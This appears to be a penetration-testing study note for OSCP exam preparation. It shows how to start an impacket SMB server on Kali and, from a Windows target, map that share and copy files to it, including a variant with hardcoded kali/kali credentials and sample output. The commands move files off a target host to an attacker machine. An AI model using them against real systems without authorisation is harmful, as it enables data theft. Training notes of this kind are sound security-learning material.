### **1. Start an SMB server on Kali**

This shares your current Kali directory.
```
impacket-smbserver share $(pwd) -smb2support
```

### **2. On Windows, Map the share**

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `net use Z: \\\\${KaliIP}\\\share`;

dv.paragraph("```bash\n" + command + "\n```");
```
### **3. From the Windows target, copy the file**
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `copy C:\\Path\\\To\\\File.txt Z:\\\\${KaliIP}\\\share\\`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

**If Windows requires authentication:**

Start the server with:

```
impacket-smbserver share $(pwd) -smb2support -username kali -password kali
```

Then on Windows:
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `net use \\\\${KaliIP}\\share /user:kali kali`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `copy C:\\Path\\To\\File.txt \\\\${KaliIP}\\share\\`;

dv.paragraph("```bash\n" + command + "\n```");
```

Reponse : 

1 file copied.